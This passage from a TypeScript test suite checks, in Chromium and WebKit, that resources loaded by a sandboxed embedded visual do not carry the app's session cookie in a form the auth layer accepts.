 * The app's session cookie and a visual that loads from Kin all it can: a script, a picture, a
 * font, a video with a track, and its own frame. Each request that still carries the cookie is
 * one the auth layer reads as carrying none.
 */
const cookieHost = Effect.gen(function* () {
  const requests: Array<{ readonly path: string; readonly headers: NodeHttp.IncomingHttpHeaders }> =
    [];
  const loaded = { app: yield* Deferred.make<void>(), page: yield* Deferred.make<void>() };
  const file = (name: string) => `${KIN_VISUAL_FILE_ROUTE}/token/${name}`;
  const page = `<!doctype html><html><head><script src="${LIBRARY(KIN_VISUAL_LIBRARIES[0])}"></script>
<style>@font-face{font-family:k;src:url("${file("font")}")}body{font-family:k}</style></head><body>
<img src="${file("image")}"><video src="${file("video")}" preload="auto"><track default kind="captions" src="${file("track")}"></video>
<p>text in the font</p>
<script>setTimeout(function () { new Image().src = "${file("last")}"; }, 300);</script></body></html>`;
  const server = NodeHttp.createServer((request, response) => {
    const url = new URL(request.url ?? "/", "http://kin.test");
    requests.push({ path: url.pathname + url.search, headers: request.headers });
    if (url.pathname === "/app") {
      // The session cookie T3 sets, and the frame the web client puts a visual in.
      response
        .writeHead(200, {
          "content-type": "text/html",
          "set-cookie": "t3_session=secret; Path=/; HttpOnly; SameSite=Lax",
        })
        .end(
          `<!doctype html><script>new Image().src = "/app-image";</script><iframe sandbox="allow-scripts" src="/visual"></iframe>`,
        );
      return;
    }
    if (url.pathname === "/app-image") Deferred.doneUnsafe(loaded.app, Effect.void);
    if (url.pathname === file("last")) Deferred.doneUnsafe(loaded.page, Effect.void);
    if (url.pathname !== "/visual") {
      response.writeHead(200, { "content-type": "text/javascript" }).end("");
      return;
    }
    const inner = url.searchParams.has("frame") && request.headers["sec-fetch-dest"] === "iframe";
    response
      .writeHead(200, {
        "content-type": "text/html; charset=utf-8",
        "content-security-policy": kinVisualContentSecurityPolicy(inner ? "page" : "outer"),
      })
      .end(inner ? kinVisualPageDocument(page) : KIN_VISUAL_OUTER_DOCUMENT);
  });
  yield* Effect.acquireRelease(
    Effect.callback<void>((resume) => {
      server.listen(0, "127.0.0.1", () => resume(Effect.void));
    }),
    () =>
      Effect.sync(() => {
        server.closeAllConnections();
        server.close();
      }),
  );
  return { port: (server.address() as NodeNet.AddressInfo).port, requests, loaded };
});

const assertNoSessionReaches = (
  requests: ReadonlyArray<{
    readonly path: string;
    readonly headers: NodeHttp.IncomingHttpHeaders;
  }>,
) => {
  const trusted = new Set<string>(DESKTOP_RENDERER_ORIGINS);
  const headers = (path: string) => {
    const found = requests.find((request) => request.path === path)?.headers ?? {};
    return Object.fromEntries(
      Object.entries(found).map(([name, value]) => [name, Array.isArray(value) ? value[0] : value]),
    );
  };
  // The control: the app's own request carries the session and the server reads it.
  assert.strictEqual(headers("/app-image").cookie, "t3_session=secret");
  assert.isFalse(ignoresBrowserCookie(headers("/app-image"), trusted));
  // The outer document is the app's own frame request; the visual's start with its frame.
  const visual = requests.filter(
    (request) => !["/app", "/app-image", "/visual"].includes(request.path),
  );
  assert.isAbove(visual.length, 3);
  for (const request of visual) {
    const sent = headers(request.path);
    if (sent.cookie !== undefined)
      assert.isTrue(ignoresBrowserCookie(sent, trusted), `${request.path} carried the session`);
  }
};

it.live("no cookie of the app's rides along on what the page loads from Kin", (ctx) =>
  Effect.gen(function* () {
    const executable = (yield* HostProcess.Environment)[TEST_BROWSER_ENV];
    if (!executable) return ctx.skip(`Set ${TEST_BROWSER_ENV} to run this test.`);
    const { port, requests, loaded } = yield* cookieHost;
    const browser = yield* Effect.acquireRelease(
      Effect.promise(() => chromium.launch({ executablePath: executable, headless: true })),
      (opened) => Effect.promise(() => opened.close()),
    );
    const tab = yield* Effect.promise(() => browser.newPage());
    yield* Effect.promise(() => tab.goto(`http://127.0.0.1:${port}/app`));
    yield* Deferred.await(loaded.app);
    yield* Deferred.await(loaded.page);
    assertNoSessionReaches(requests);
  }).pipe(Effect.scoped),
);

it.live("no session rides along on what the page loads from Kin in WebKit", (ctx) =>
  Effect.gen(function* () {
    const runner = yield* webkitRunner();
    if (runner === undefined) return ctx.skip(WEBKIT_SKIP);
    const { port, requests, loaded } = yield* cookieHost;
    yield* openInWebKit(runner, `http://localhost:${port}/app`);
    yield* Deferred.await(loaded.app);
    yield* Deferred.await(loaded.page);
    assertNoSessionReaches(requests);
  }).pipe(Effect.scoped),
);
